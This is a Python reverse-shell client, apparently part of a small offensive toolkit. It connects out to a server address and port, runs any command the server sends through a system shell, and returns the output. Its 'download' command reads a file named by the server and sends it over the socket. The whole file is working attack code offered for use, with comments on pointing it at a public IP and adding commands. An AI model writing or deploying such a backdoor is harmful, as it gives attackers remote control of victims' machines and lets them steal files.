import os
import random
import socket
import string
import subprocess
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else 'IP ADDRESS OF THE SERVER' # Change this to your public ip if you want to use it outside of your local network
PORT = int(sys.argv[2] if len(sys.argv) > 2 else 5555) # Change the port if you want to but make sure to change it in Client.py as well
s = socket.socket()
s.connect((HOST, PORT))
# Example for custom command, put your code in varName (you can change the name if you want)
# varName = print('test')

while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break
        
    # This will close the connection
    if cmd.lower() in ['down', 'download']:
        yesNo = s.recv(1024).decode()
        if yesNo == 'y':
            print("\033c", end='')
            sep = '#SEP#'
            file = s.recv(1024).decode()
            file_size = os.path.getsize(file)
            if sep in file:
                print('Warning invalid filename')
                exit(-1)
            s.send(f'{file}{sep}{file_size}'.encode())
            with open(file, 'rb') as f:
                while True:
                    file_bytes = f.read(1024)
                    if not file_bytes:
                        break
                    s.sendall(file_bytes)
            print('Download complete closing...')
            s.close()
            sys.stderr = object
        elif yesNo == 'n':
            continue

    # To add your own command remove the # below and change alias with the command alias and command with the command name
    # Make sure to add it to RevShellServer.py as well
    # if cmd.lower() in ['alias', 'command']:
        # s.send(varName.encode())

    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    if len(result) == 0:
        result = 'OK'.encode()

    s.send(result)

s.close()
